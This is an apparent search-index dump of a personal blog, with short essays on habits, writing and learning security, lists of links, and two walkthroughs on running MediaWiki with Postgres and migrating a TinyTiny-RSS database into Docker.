long and know to much about bad outcomes. Catastrophizing is a quite emotion response. Being paranoid does not help well with this emotion.\nI guess this is how to grow, to confront yourself with one\u0026rsquo;s fears!\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-06-fear-of-publishing/","tags":["100daystooffload"],"title":"Fear of Publishing"},{"categories":["Blog"],"contents":"Feedback is something we all seek for, but almost all are lacking, this blog is no exception. To increase the chance of more of it, I\u0026rsquo;m thinking of adding additional channel of communication, for instance an new mail account, Reddit posts. In the moment I\u0026rsquo;m using only Twitter to allow some sort of commenting.\nThe reason I want more channels is that I think Twitter is a horrible platform for discussion. While it is great for feedback though. Because it does work well for smaller conversations with maybe two persons. Once the discussion grows it becomes rather complicated to keep track of it.\nThis relates to the problem that Twitter make is rather difficult to follow a moving discussion. Everyone is allows reply to any previous statement. Which might seem good for feedback, but for an interactive debate it causes the flow to break.\nEven worse, people might create completely new discussion out of a responses that goes completely bananas while always having the original author in back, spamming him. That might seems senseful in the hope to focus on engagement, however, to me this seems absolutely unnatural in any discussion that is moving forward. But this are only my two cents to this matter and my views a obviously blindsided, because I do not use Twitter really that often for any form of discussion.\nWhat I really want in end is to have meaningful discussions and while this is my intend I\u0026rsquo;m also very reluctant with any further communication channel, even Twitter. This is caused by my fear of publishing. I might have written about this before, but reducing the effort one has to take to provided feedback might also imply to read something negative.\nBut I do not want to be stuck on that mindset, instead I\u0026rsquo;m going to confront myself with the topic and open up.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-05-feedback-channels/","tags":["Feedback","100daystooffload"],"title":"Feedback Channels"},{"categories":["Habits"],"contents":"Yesterday, I had a intense conversation about the topic of hecticness. Meaning when a person becomes rushes into finishing a task or something.\nThe key take away is the following: We have tendency to avoid unpleasant things. Becoming hectic is a strategy of avoids, instead of focusing on doing it good, you choose to get done as fast as possible. This leads however to a decline in quality in any regards. This is a quite intense recognition to me. In learn therapy it is a sign of discomfort when the persons speeds up. But more it is a form of habit that is pick up implicitly.\nMoreover what you should do instead is taking it more slowly, something very difficult. That\u0026rsquo;s why you shouldn\u0026rsquo;t focus on goals but on systems instead. A habit should therefor not be in place to make you more effective or help you to reach your goal. Instead it should be understood as a system in which reach your goal is an outcome of that very system. Meaning that the achievement one desires is rather a symptom of a good system not it\u0026rsquo;s destination. Obviously, you can\u0026rsquo;t generalise that all hectics are a representation of discomfort. When you\u0026rsquo;re stress because there is a time limit that perfectly normal, I guess.\nBut making the parallel to my difficulties to write are quite well paralleled. Writing was always something I assumed everyone is able to do perfectly fine and my struggle is only a reflection of my own inadequacy. So I\u0026rsquo;ve become hectic and try to be done as quick as possible. This triggered a negative feedback loop: Because I was rushed, I made mistakes, this mistakes were noticed and I receive the negative feedback that reinforcing my view of inadequacy in terms of writing.\nIsn\u0026rsquo;t that a fantastic insight?\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-04-hectics/","tags":["Writing","100daystooffload"],"title":"Hectics"},{"categories":["Habits"],"contents":"Habits are difficult to maintain, at least new ones. Everyone can related to this the one or the other way. With a habit a routine is implies that you do more than twice. However, the issue is doing the same routing over a longer period of time, why?\nThe answer I think might be quite simple: We want to feel good and we want to feel it now, however, there are many ways to get there. You \u0026lsquo;repair\u0026rsquo; your emotions by watching some funny thing or view some videos. You take the shortest path to get there, why spend more effort than necessary?\nIn short there are things that feel more well for us than the habit we intend to do. Because in the beginning it\u0026rsquo;s not rewarding enough. The first days maybe, but after a while it turn into actual work and that where the first hard challenges to keep up arrives.\nThis might related to the time you have to spare, because you\u0026rsquo;re on holiday for instance. Once the time, motivation or environment changes and you\u0026rsquo;re back to the normal busy day where different topic take over you, are you going to resort back to the new habit? Will you make time for it what\u0026rsquo;s your plan?\nThis is where the problem kicks in, because something new is always related to conscious decision. But with decision fatiguety around the corner you only have so much capacity for something. On the end of the day you might skip it out to favor something you already know. That\u0026rsquo;s why I think the habit shouldn\u0026rsquo;t be a decision, instead it should be done when the timing is right until you feel good with it. For me this is in the beginning of a day.\nBut I already see some problem, it will be working well for properly two week, then I\u0026rsquo;m going to hit the first \u0026lsquo;wall\u0026rsquo; where it becomes more and more work and I start to fall off. Let\u0026rsquo;s hope that I can keep up after that time.\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-03-about-habits/","tags":["100daystooffload"],"title":"About Habits"},{"categories":["security"],"contents":"Security is a weird topic. For once it does not consist of defined field of its own, but instead is a generic one found in other field. Meaning: It does not matter what subject within a computer you\u0026rsquo;re, it has always some sort of security implication and that makes it so odd to work with. Sure, there are some kind of stand-alone topics, however, most of the seem less likely to be really good useable.\nSomeone will point out that fuzzing is here a good example, however, while learning the tools in itself are great matter for security it\u0026rsquo;s important to see what it is doing in the end and that is helping you to points to faulty programs. It also requires you to understand in-depth what\u0026rsquo;s going and it won\u0026rsquo;t create a exploit for you. And while learning the tool might seem like a good security practices it is similar to learning Photoshop as artist. Knowing the tool does not make you an artist. Instead, it is just a different strategy to find flaw.\nThe point is you\u0026rsquo;re piggy packing on any other topic to seek out mistakes to make use of it and that is what we\u0026rsquo;re calling security. Making it often difficult to get into the topic in the first place, because the learning curve is quite high.\nAdditionally, there is the problem with the feedback one will receive out of the learned: It is often wicked, not kind. That seems a bit contrarian at first. But when you think about it you often seek out for mistakes other have made and try to make use of them. But this can go into the wrong direction, leading to a check-box type of security.\nNot every mistakes can be exploited, not every flaw is useful, sometime flaws becoming even features. There are some pattern that might help you to find such flaws, however, I believe that you\u0026rsquo;re required to have a more deeper understand of the underlying problem to make good use of it. This requires a good amount of effort and it is not certain that this effort will lead to any return on investment, stressing ones frustration tolerance.\nAnother problem that complicated this matter, at least for me, is overlearning. I\u0026rsquo;ve tried to write about this matter before, but when you\u0026rsquo;ve seen so many talks about security you becomes stalled on topics. You look at something and try to re-do what you\u0026rsquo;ve learned. But this is not how you would work on that matter, instead, it adds much strain to the effort one makes then.\nIt is like playing baseball for the first time and expecting to hit a homerun and you become frustrated when you not even hitting the ball.\nThe most important part here is to have fun and not get lost. Both things I often have problem with when engaged with a topic that relates to security and other topics too, actually, because I can\u0026rsquo;t leave it to rest thanks to the Zeigarnik Effect. A friend of mine had a quite good tip: Try to define what you\u0026rsquo;re going to do and timebox it. Once you\u0026rsquo;re out of time move on. This the important part here. So I opened the first topic that I might like on my tweeter feed and going to spend some time on it. First stop kernel exploitation!\nLooking forwards to it!\nso far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-02-learning-security/","tags":["learning","100daystooffload"],"title":"Learning Security"},{"categories":["Blog"],"contents":"Hey happy new year everyone! I\u0026rsquo;m wishing everyone the best for the year of 2021! In this year I’m planing to participate in some sort of writing challenge called: #100DaysToOffload\nIt is a challenge to write a hundred blog posts within a year and because I want to learn more about security and other stuff I thought I can learn every day a bit and then post it?\nThe main goal is to have a good habit of writing developed. So a flashpost with some hyperlinks in it would not count. This idea is a bit older and should not be seen as a new years\u0026rsquo; revolution but instead of responsibility. A commitment that fits quite well into my time ‘schedule’ because, I’m at home until April. That around 90 days, but I’m certain that I will be able to write ten more post in the remaining days of the year.\nIt is not that I do not have much time to spare, however, taking the time of the day to write about something as a habit is a longer plan of mine. In the year that passed I failed to get one post each week out. Instead, I try to increase the burden by add some social feedback to this.\nIn general I dislike sharing my posts on social networks, however, it might be in this regard beneficial to me have another format of feedback? Disregards, let the writing begin!\nSo far,\nakendo\n","permalink":"https://blog.akendo.eu/post/2021-01-01-100daystooffload/","tags":["General","100DaysToOffload"],"title":"100DaysToOffload"},{"categories":["News"],"contents":" Underground Tradecraft — A Provisional IRA Operations Plan The Nazi Interrogator Who Killed Them With Kindness An inside look at CVE-2020-10713, a.k.a. the GRUB2 \u0026ldquo;BootHole\u0026rdquo; Scanning firewalls for differences in IPv4 and IPv6 rules | Sebastian Neef - 0day.work ","permalink":"https://blog.akendo.eu/flash/24.12.2020-linkdrop/","tags":[],"title":"24.12.2020 - link drop"},{"categories":["News"],"contents":" When You Start to Miss Tony from Accounting - Hidden Brain - Omny.fm Between Two Worlds - Hidden Brain - Omny.fm Gemeinschaftsbildung - Prozess(in german) Gemeinschaftsbildung - Buch(in german) A Book Like Foo: Powerful Book Recommendations ","permalink":"https://blog.akendo.eu/flash/21.12.2020-linkdrop/","tags":["Podcast","Gemeinschaft and Gesellschaft"],"title":"21.12.2020 - link drop"},{"categories":["News"],"contents":" wi fi - \u0026ldquo;Cannot add/update network before store is read!\u0026rdquo; when trying to save a WiFi network on Android 9 - Android Enthusiasts Stack Exchange Quake’s 3-D Engine: The Big Picture Email Lessons from Napoleon Bonaparte – The Sweet Setup Between Two Worlds - Hidden Brain - Omny.fm Screaming into a Void - Hidden Brain - Omny.fm A Conspiracy of Silence - Hidden Brain - Omny.fm Where Gratitude Gets You | Hidden Brain Media COVID-19 and the Future of Us - StarTalk Radio - Omny.fm ","permalink":"https://blog.akendo.eu/flash/10.12.2020-linkdrop/","tags":["Android","Wifi","Quake","Mail"],"title":"10.12.2020 - link drop"},{"categories":["News"],"contents":" Share port 22 between Gogs inside Docker \u0026amp; the local system ","permalink":"https://blog.akendo.eu/flash/09.12.2020-linkdrop/","tags":["SSH","gogs"],"title":"09.12.2020 - link drop"},{"categories":[],"contents":"For a side project of mine, I was looking for a tool to collect a lot of information. The focus was at first to have a hackmd instance or something like it. My friend, who wants to use it with me, wanted to have access control over some of the content. After researching it, I saw that none of the intended tools provides such a thing. Instead, my friend suggested MediaWiki. While I refused at first, I’ve decided to take a look at it first. The last time was something around 2010 or so. I have to admit that a lot has changed.\nSo I conitnued on the tts type of services and started to look for a docker container. MediaWiki provides this, but only with support for MySQL, which I disliked. A look into the container showed, that it is not much necessary to get a postgres db running here.\nIn this post I\u0026rsquo;m going to document the installation and configuration steps. I guess it will take some posts to get everything covered. However, it is also a work in process.\nInstallation of Media Wiki with a postgres database backend At first I re-used the same database container from postgres with the default image from alpine. MediaWiki provides some images, similar to the postgres I use the alpine image. I copied the docker-compose file from my ttrss post as template with some changes. Creating the local volumes and update the volume path and setting the password:\nversion: \u0026#39;3\u0026#39; services: mediawiki: image: mediawiki restart: always ports: - 8080:80 depends_on: - db #volumes: # - /var/www/html/images # After initial setup, download LocalSettings.php to the same directory as # this yaml and uncomment the following line and use compose to restart # the mediawiki service # - ./LocalSettings.php:/var/www/html/LocalSettings.php db: restart: always image: \u0026#39;postgres:13-alpine\u0026#39; volumes: - \u0026#34;./volumes/postgresql:/var/lib/postgresql/data\u0026#34; environment: - POSTGRES_PASSWORD=postgres Now were everything is in place I run the first docker-compose up. Without much issue the media wiki container startes, also is the postgres db, neat. Access via Port 8080 seems fine and so does the MediaWiki Setup until I have to select the databse. Here comes the first expected issue: We can\u0026rsquo;t select postgres. Why?\nPHP in MediaWiki container The first thought that comes to mind is the fact that PHP is missing the necessary module for it. So let find where PHP has it modules placed. For this we start to work with the running container by starting a shell within the MediaWiki Container.\n$ docker-compose exec mediawiki bash root@6232d8ee302c:/# The first oddness in the MediaWiki container is that the PHP is not installation via apt/dpkg. So where is it?\nAfter some whereis and find I figureed out that php is deployed into /usr/local/bin/php by a costom docker-php-* toolkit. I\u0026rsquo;m checking this with within the docker image project of media wiki. There using a template file for it. That makes it a bit odd at first.\nThere are using a docker-php-ext-configure and docker-php-ext-enable tool. Once we know how to get it running the Steps are to install and enable the necessary for PHP to make use of postgres. The typical package name is pgsql. Let\u0026rsquo;s give it a try:\nroot@6232d8ee302c:/var/www/html# docker-php-ext-install pgsql Configuring for: PHP Api Version: 20180731 Zend Module Api No: 20180731 Zend Extension Api No: 320180731 checking for grep that handles long lines and -e... /bin/grep checking for egrep... /bin/grep -E checking for a sed that does not truncate output... /bin/sed checking for cc... cc checking whether the C compiler works... yes checking for C compiler default output file name... a.out checking for suffix of executables... checking whether we are cross compiling... no checking for suffix of object files... o checking whether we are using the GNU C compiler... yes checking whether cc accepts -g... yes checking for cc option to accept ISO C89... none needed checking how to run the C preprocessor... cc -E checking for icc... no checking for suncc... no checking whether cc understands -c and -o together... yes checking for system library directory... lib checking if compiler supports -R... no checking if compiler supports -Wl,-rpath,... yes checking build system type... x86_64-pc-linux-gnu checking host system type... x86_64-pc-linux-gnu checking target system type... x86_64-pc-linux-gnu checking for PHP prefix... /usr/local checking for PHP includes... -I/usr/local/include/php -I/usr/local/include/php/main -I/usr/local/include/php/TSRM -I/usr/local/include/php/Zend -I/usr/local/include/php/ext -I/usr/local/include/php/ext/date/lib checking for PHP extension directory... /usr/local/lib/php/extensions/no-debug-non-zts-20180731 checking for PHP installed headers prefix... /usr/local/include/php checking if debug is enabled... no checking if zts is enabled... no checking for re2c... re2c checking for re2c version... 1.1.1 (ok) checking for gawk... no checking for nawk... nawk checking if nawk is broken... no checking for PostgreSQL support... yes, shared checking for pg_config... not found configure: error: Cannot find libpq-fe.h. Please specify correct PostgreSQL installation path This PHP module requires a system-wide package, which one? Let\u0026rsquo;s google it. After some google I was please to see that the libpq-dev packages is necessary within the container. So just install it within the container.\nThere are using a docker-php-ext-configure and docker-php-ext-enable tool. Once we know how to get it running the Steps are to install and enable the necessary for PHP to make use of postgres. The typical package name is pgsql. Let\u0026rsquo;s give it a try:\nroot@6232d8ee302c:/var/www/html# apt update [8/539] Get:1 http://deb.debian.org/debian buster InRelease [121 kB] Get:2 http://security.debian.org/debian-security buster/updates InRelease [65.4 kB] Get:3 http://deb.debian.org/debian buster-updates InRelease [51.9 kB] Get:4 http://security.debian.org/debian-security buster/updates/main amd64 Packages [234 kB] Get:5 http://deb.debian.org/debian buster/main amd64 Packages [7906 kB] Get:6 http://deb.debian.org/debian buster-updates/main amd64 Packages [7868 B] Fetched 8387 kB in 2s (3503 kB/s) Reading package lists... Done Building dependency tree Reading state information... Done 2 packages can be upgraded. Run \u0026#39;apt list --upgradable\u0026#39; to see them. root@6232d8ee302c:/var/www/html# apt search libpq-dev Sorting... Done Full Text Search... Done libghc-postgresql-libpq-dev/stable 0.9.4.1-2+b2 amd64 low-level binding to libpq libpq-dev/stable 11.9-0+deb10u1 amd64 header files for libpq5 (PostgreSQL library) root@6232d8ee302c:/var/www/html# apt install libpq-dev Reading package lists... Done Building dependency tree Reading state information... Done The following additional packages will be installed: libpq5 Suggested packages: postgresql-doc-11 The following NEW packages will be installed: libpq-dev libpq5 0 upgraded, 2 newly installed, 0 to remove and 2 not upgraded. Need to get 330 kB of archives. After this operation, 1460 kB of additional disk space will be used. Do you want to continue? [Y/n] y Get:1 http://deb.debian.org/debian buster/main amd64 libpq5 amd64 11.9-0+deb10u1 [167 kB] Get:2 http://deb.debian.org/debian buster/main amd64 libpq-dev amd64 11.9-0+deb10u1 [163 kB] Fetched 330 kB in 0s (1629 kB/s) debconf: delaying package configuration, since apt-utils is not installed Selecting previously unselected package libpq5:amd64. (Reading database ... 24883 files and directories currently installed.) Preparing to unpack .../libpq5_11.9-0+deb10u1_amd64.deb ... Unpacking libpq5:amd64 (11.9-0+deb10u1) ... Selecting previously unselected package libpq-dev. Preparing to unpack .../libpq-dev_11.9-0+deb10u1_amd64.deb ... Unpacking libpq-dev (11.9-0+deb10u1) ... Setting up libpq5:amd64 (11.9-0+deb10u1) ... Setting up libpq-dev (11.9-0+deb10u1) ... Processing triggers for libc-bin (2.28-10) ... Now we we\u0026rsquo;re going re-run the previous command, I\u0026rsquo;m skipping the output of a successful installation. At this point we need to restart the contianer or more the apache2 service. The container uses a apache2 to running in foreground, however, apache2 can be reload via the apache2ctl command without the neext to restart the whole container anew, awesome!\nThe next look on the database creation page of MediaWiki shows that postgresql is a choice now.\nContinue to the MediaWiki installation One great thing about the installation route of Media Wiki is that their asking for the database user. Gosh this is done right ;-)\nOne thing during the installation is that the tables are created twice, why? Anyway seems to work just fine. After the database user creation is completed the next step is to configure the Wiki, I choose Priavte Wiki with the following Extensions:\nInterwiki Renameuser ReplaceText VisualEditor WikiEditor TemplateData PdfHandler MultimediaViewer Once the installation is completed you will download a LocalSettings.php file that needs to be deploy into the webroot of the MediaWiki container.\ndocker cp Downloads/LocalSettings.php docker-mediawiki_mediawiki_1:/var/www/html/LocalSettings.php And we\u0026rsquo;re done with the installation at first! There are some addtional settings that needs to configure that is to allow file upoads and disable Caching (to few requests). Next post is how to automate this a bit better in context of the image creation\nbest regards,\nakendo\n€dit: For some reason the post was mixed up because of a copy and post fuck up ;-(, fixed now.\n","permalink":"https://blog.akendo.eu/post/2020-12-01-mediawiki-part-one/","tags":[],"title":"MediaWiki Docker[part one]"},{"categories":[],"contents":"Normaly this link:\u0026lsquo;Undermining Democracy - Schneier on Security\u0026rsquo; would be just another link for my link drop, however, I like to add a thoughts to it: One of the key problems is that the Republicans have a very dichotomous thinking model - meaning to think in black and white terms. Leading to a collective narrative in which, whatever the democrats are doing is considered to be bad and only what the Republicans do is good.\nWe saw that behaviour in the Convid-19 responses in Congress regards to social benefits. Instead of prolonging them they remain stalled, because it would imply a bipartisan agreement to prolonge the benefits and be thefore be a compromise, which would be therefore a violation of the narrative of the Republican party.\nFor this very election the Republicans have decided that it is more important to consist to this narrative then the reality. And thanks to an abundant amount of misinformation it\u0026rsquo;s possible find effortless stories that fit into this view. Allowing to victimize them and break with norms of a democracy. The democrats did something similar four years ago, I fear only that the ramification a way worse this time. While the democrats rejected the presedict they still upholded the basic princiable of a election.\nThis all leads to a cycle of polarisation and a dividing of the sides. One teach back in higher school predicted (around 15 years ago) that the U.S is going to civial war within the next 20 years and I something fear that this prediction becomes true.\n","permalink":"https://blog.akendo.eu/post/2020-11-30-comment-to/","tags":[],"title":"Comment To a link"},{"categories":["News"],"contents":" rust in curl with hyper | daniel.haxx.se ","permalink":"https://blog.akendo.eu/flash/28.11.2020-linkdrop/","tags":["Rust"],"title":"28.11.2020 - link drop"},{"categories":["News"],"contents":" CSCP by Nsc42 Looking Back on the Spanish War | The Orwell Foundation I violated a code of conduct · fast.ai Code of conduct training \u0026ldquo;Why don\u0026rsquo;t you just hit him?\u0026rdquo; — the worst possible anti-harassment advice | Ada Initiative Don\u0026rsquo;t Sweat the Microaggressions - The Atlantic The Pseudo-Science of Microaggressions by Althea Nagai | NAS Microaggression - Wikipedia ","permalink":"https://blog.akendo.eu/flash/27.11.2020-linkdrop/","tags":["Security","Orwell","Code of Conduct","Microaggressions"],"title":"27.11.2020 - link drop"},{"categories":["News"],"contents":" ","permalink":"https://blog.akendo.eu/flash/25.11.2020-linkdrop/","tags":["Writing"],"title":"25.11.2020 - link drop"},{"categories":["News"],"contents":" r2c blog — Exploiting dynamic rendering engines to take control of web apps GitHub - returntocorp/semgrep: Lightweight static analysis for many languages. Find bug variants with patterns that look like source code. PayloadsAllTheThings/Server Side Request Forgery at master · swisskyrepo/PayloadsAllTheThings · GitHub Why everyone is stupid except me Kubernetes Executor should block CAP_NET_RAW capability by default; allow configuration (#26833) · Issues · GitLab.org / gitlab-runner · GitLab SAD DNS Explained ","permalink":"https://blog.akendo.eu/flash/21.11.2020-linkdrop/","tags":["Security","semgrep","SSRF"],"title":"21.11.2020 - link drop"},{"categories":["News"],"contents":" Six right livelihood guidelines Babies\u0026rsquo; random choices become their preferences | Hub Using Let\u0026rsquo;s Encrypt for internal servers - Philipp\u0026rsquo;s Tech Blog It\u0026rsquo;s Time To Admit It: The X.Org Server Is Abandonware - Phoronix How solitude and isolation can affect your social skills - BBC Future ‘Culture wars’ are fought by tiny minority – UK study | Identity politics | The Guardian Culture wars risk blinding us to just how liberal we\u0026rsquo;ve become in the past decades | Identity politics | The Guardian Kenan Malik on cultural appropriation - ArtReview INFILTRATE ONLINE - CVSS AN INTRODUCTION TO FAIL on Vimeo ","permalink":"https://blog.akendo.eu/flash/05.11.2020-linkdrop/","tags":["buddhism","psychology","Dyslexic","Letsencrypt","Xorg","isolation","culture","CVSS"],"title":"05.11.2020 - link drop"},{"categories":["News"],"contents":" Moral Combat - Hidden Brain - Omny.fm ","permalink":"https://blog.akendo.eu/flash/30.10.2020-linkdrop/","tags":["Psychologies","Moral"],"title":"30.10.2020 - link drop"},{"categories":["News"],"contents":" Why older people are harder to vaccinate - BBC Future ","permalink":"https://blog.akendo.eu/flash/19.10.2020-linkdrop/","tags":["Vaccinate"],"title":"19.10.2020 - link drop"},{"categories":["Linux"],"contents":"In the previous post we got a TinyTiny-RSS Feedreader running in a docker environment. Because the migrate of the database takes more effort we will discuss it in this post. We will restore the old database to docker and upgrade it. In the previous post we had a running installation without any data.\nDatabases restoration and upgrade Next step - after getting the base installation running - was to import the old database of ttrss to the db container. At this point, things become messy for several reasons. First, the docker installation routine of TT-RSS does not support a separated databases user. Why? Because in startup.sh it tries to create a database extension for the given database variable within the docker-compose file.\nExtension within Postgres are similar to modules, it allows to provide additional features in a default installation. For instance it is possible to write functions in C, using the corresponding extension. Allowing a database within postgres to make use of an extension is something only the super user is allowed to do.\nNot all extensions require super user rights. For ttrss we need to make use of the pg_trgm extension, where the CREATION privilege should enough. However, this does fail for some reason and startup.sh fails. The startup.sh validates the existing of the given extension by creating it if it is not presented already. To workaround the issue I\u0026rsquo;ve tried to alter the installation script for this with no success. Probably because I do not use the latest version of postgres, with more time and effort I could get to the bottom of this, however, I want to be done.\nI conclude this as a bad practice and further more it adds a taste of dislike to me to run a DB service via docker. It feels unnatural because the container makes a lot of assumption about it\u0026rsquo;s operation. For example: It assumes that it will be run in a \u0026rsquo;embedded\u0026rsquo; fashion without direct User access. That means that you\u0026rsquo;re not supposed to login into the postgres database via a shell, however, that exactly what a postgres requires you to do for maintenance like restoring a database. This adds quite some pain to the process of importing an older backup to a fresh docker installation.\nInstead of modifying the installation script to respect some older database, I\u0026rsquo;ve decided to do this in a one shot act. I copied the backup dump into the volume of the running container and restored it to the provided postgres of the setup.sh databas that the docker installation is using by default.\nThe restoration process was not working because my original database dump used a separated postgres role for access. This lead to some errors while writing some data with the role to it. More error where shown for the reason that older data were written to the already created table structure that consistent of a newer schema version than the data has been created for. Like some keys had became unique in the newer release of the TT-RSS and therefor made the restoration inconsistent. The schema_version of my dump was:\nrss=# SELECT * FROM ttrss_version; schema_version ---------------- 126 The latest one is\npostgres=# SELECT * FROM ttrss_version; schema_version ---------------- 140 To get the dump correctly restored the right database with the right role is necessary. Only then it is possible to upgrade. Unfortunately, the postgres dump did not include the creation of the database and role. So what can we do? At this point I was thinking to alter the dump and replace the name of the role to fit the current database. The pity here is that the role name and the databases name are the same: rss.\nThat seems dumb in hindsight, so renaming the key word is not well suitded. Besides, the database tables names often include the phrasing, you guess it, rss. Hence renaming the databases dumb to use a separated role or username seems to be more work.\nHowever, I remembered one thing, instead of hacking my way around of the missing user, why not just extract the data from the VM? Fortunately, I had the original volume from the database still around. After some magic with VM volume and starting it in a chroot I created a dump from the postgres database from the old VM. As a note for later: That\u0026rsquo;s why you\u0026rsquo;re using pg_dumpall.\nLooking at output of the the pg_dumpall I\u0026rsquo;ve got an idea for the installation route to create the user, make it to the SuperUser let it setup the database extension and THAN drop the privilege. Not sure if I should do this.\nAnyway back to the migration:\npostgres=# CREATE ROLE rss; CREATE ROLE postgres=# ALTER ROLE rss WITH NOSUPERUSER INHERIT NOCREATEROLE NOCREATEDB LOGIN NOREPLICATION PASSWORD \u0026#39;rss\u0026#39;; ALTER ROLE Once the database and rile is present restoring the data back is as easy as eating cake.\nMigration to the newer release After the first step comes the second, migrating the database to a new schema. For this step we need reconfigure the ttrss configuration to to use the freshly restored rss database instead of the postgres one. We do not have to start the container with a exec, because the files is within the volumes datapoint on the filesystem. After it is changed we can test it by execution the update_daemon2.php from within a running ttrss container.\n/ # sudo -u app /usr/bin/php /var/www/html/tt-rss/update_daemon2.php [16:54:00/84] Spawn interval: 120 sec Schema version is wrong, please upgrade the database. Here a note about fuckup in your system environment: They made you question what\u0026rsquo;s going on until you notice that the disk was running full and the system be almost shut.. After some restart trouble and a broken btrfs issue, a reboot and reset of all of docker I\u0026rsquo;ve got back to it and could the app to the upgrade page. It started to migrate the database to new schema and stopped at version 134. The problem was that the table ttrss_feeds had an entry that was invalid for the migration:\nalter table ttrss_feeds add constraint ttrss_feeds_feed_url_owner_uid_key unique (feed_url, owner_uid) TTRSS was to kind to display an error with the row that was duplicated. Once the duplicated row was deleted the databases migration finished without issue.\nAt this stage I was able to login with my old user to the instance. After some clean up I\u0026rsquo;ve decided to run the feed update by executing the update_daemon2.php script. It will go through all feeds in the database and check for changes on the server and import them. This way the server knew that a rss feed has an update. The first update took quite some time until all was updated.\nConclusion So what necessary to get it going? Get the containers to run, update the configuration file after the deployment to new database. Importe the databases with the porper role pre-existing. Make sure that the feeds are not duplicated and then keep it running.\nSo how does it look in the end:\n$ docker-compose ps Name Command State Ports ---------------------------------------------------------------------------------------------------------------------- docker-db_1 docker-entrypoint.sh postgres Up 5432/tcp docker-nginx-proxy_1 /app/docker-entrypoint.sh ... Up 0.0.0.0:80-\u0026gt;80/tcp docker-ttrss_1 /bin/sh -c /startup.sh Up 0.0.0.0:9000-\u0026gt;9000/tcp, 0.0.0.0:9001-\u0026gt;9001/tcp docker-web_1 /bin/parent caddy --conf / ... Up 2015/tcp, 443/tcp, 80/tcp so far, akendo\nSources:\nhttps://git.tt-rss.org/fox/tt-rss https://tt-rss.org/wiki/FAQ https://git.tt-rss.org/fox/ttrss-docker-compose/src/master/docker-compose.yml https://git.tt-rss.org/fox/ttrss-docker-compose/src/master/app/updater.sh https://git.tt-rss.org/fox/ttrss-docker-compose/src/master/web/Caddyfile https://git.tt-rss.org/fox/ttrss-docker-compose/src/master/web-nginx/nginx.conf ","permalink":"https://blog.akendo.eu/post/2020-10-12-ttrss-to-docker-part-2/","tags":["TTRSS","docker","postgres"],"title":"TTRSS to Docker[Part two]"},{"categories":["Linux"],"contents":"Some time ago I wrote about the TinyTiny RSS. I did shutdown the service in 2017 because the server it was running got de-provisioned. But everything was stored on a backup.\nSince I got some time to spare I\u0026rsquo;ve decided to re-active the TT-RSS service, however, because I lack the server in the internet, it was moved to a small system at home. This time the deployment should be run on a docker container to allow better deployment. The TT-RSS project itself provides a docker-compose file. It is spilited into seperated container for different task. Many aspects of the services has been decopubled including an container to updated the feeds.\nThe container names are quite self-explanatory:\ndb: Database of the application app: The TT-RSS php code backup: Frequend job to execute backups of the database update: The PHP code that will trigger the refreshing of the feeds web: Small webserver to handle requests and forward them to app Importing the containers To get started I\u0026rsquo;ve ported the app and db from the offical docker-compose first to my personal docker-compose file.\ndb: restart: always image: \u0026#39;postgres:13-alpine\u0026#39; volumes: - \u0026#34;./volumes/postgresql:/var/lib/postgresql/data\u0026#34; environment: - POSTGRES_PASSWORD=${POSTGRES_PASSWORD} - POSTGRES_USER=${POSTGRES_USER} ttrss: ports: - \u0026#34;9000:9000\u0026#34; build: context: ./ttrss restart: unless-stopped environment: - DB_TYPE=pgsql - DB_HOST=db - DB_NAME=${POSTGRES_USER} - DB_USER=${POSTGRES_USER} - DB_PASS=${POSTGRES_PASSWORD} - OWNER_UID=${OWNER_UID} - OWNER_GID=${OWNER_GID} - SELF_URL_PATH=${SELF_URL_PATH} volumes: - \u0026#34;./volumes/ttrss/:/var/www/html\u0026#34; depends_on: - db I\u0026rsquo;m doing this because of a pre-existing infrastructure hosted with docker, this way I can use some services already in place like nginx for instance.\nThe appended configuration was already altered, the app was renamed to ttrss to be more identifiable with in the many services I run. Also, I prefer to use relative paths to provide storage. Once the changes were in place we only had to run docker-compose up ttrss. As expected, the first start was not successful, but why?\nAccessing the port 9000 of ttrss container directly caused the connection to be restted. Maybe the port forward was not working correctly? After some check it became clear: The ttrss container only takes CGI requests and the web container was necessary to process the CGI resources from Caddy and forward it correctly to the ttrss container. So I copied it down the web entry. It also became necessary to update the upstream name of the Caddyfile to be not app but ttrss.\nweb: environment: - VIRTUAL_HOST=ttrss - VIRTUAL_PORT=2015 build: ./web restart: unless-stopped volumes: - \u0026#34;./volumes/ttrss/:/var/www/html:ro\u0026#34; depends_on: - ttrss Once web started it was almost completed. Accessing the port 2015 opens the website of ttrss and asking for a password. At this stage I didn\u0026rsquo;t know the default password of the service. I tried some basic things like \u0026lsquo;admin:admin\u0026rsquo; and so on. After five minutes I decided to try a different way, right, check for the password with in the database and google the hash. The default password of TT-RSS is \u0026lsquo;password\u0026rsquo;. Gosh I should have tested that, who ever will guess this, I didn\u0026rsquo;t !?\nProper serving of my old instance I\u0026rsquo;m using a nginx-proxy within the docker-compose file that reads out the environment variables for the hostname parameter, this way the proxy knows what name to listen for and where to forward the traffic to for a corresponding container. Once this is configured you\u0026rsquo;re can access the service with the hostname in my case it will serve http://ttrss.\nOn this point we need to update the .env to include the correct hostname. I had to rebuild the ttrss container and the took a bit of time until the redirection from the nginx-proxy was working.\nConclusion I have now a running TT-RSS service within a docker-compose. The next part will be the database restoration and migration, because it takes quite more effort to get it running it will be a post of it\u0026rsquo;s own.\nso far\nakendo\n","permalink":"https://blog.akendo.eu/post/2020-10-05-ttrss-to-docker/","tags":["TTRSS","docker"],"title":"TTRSS to Docker"},{"categories":["News"],"contents":" COVID-19 and Acedia - Schneier on Security Acedia: the lost name for the emotion we\u0026rsquo;re all feeling right now Are we on the road to civilisation collapse? How Western civilisation could collapse ","permalink":"https://blog.akendo.eu/flash/04.10.2020-linkdrop/","tags":["Psychology","what-if","Risk"],"title":"04.10.2020 - link drop"},{"categories":["News"],"contents":" Cosmic Queries – The Deep by StarTalk Radio | Free Listening on SoundCloud The companies that help people vanish - BBC Worklife J. K. Rowling\u0026rsquo;s writing style in Harry Potter ","permalink":"https://blog.akendo.eu/flash/23.09.2020-linkdrop/","tags":["jouhatsu","space","writing"],"title":"23.09.2020 - link drop"},{"categories":["Software"],"contents":"In the last days my main occupation was writing. Once a bit time was at hand I focused on getting something written, by hand or by the computer. For projects that mainly consist of written text, I needed to have some type bookish-like website 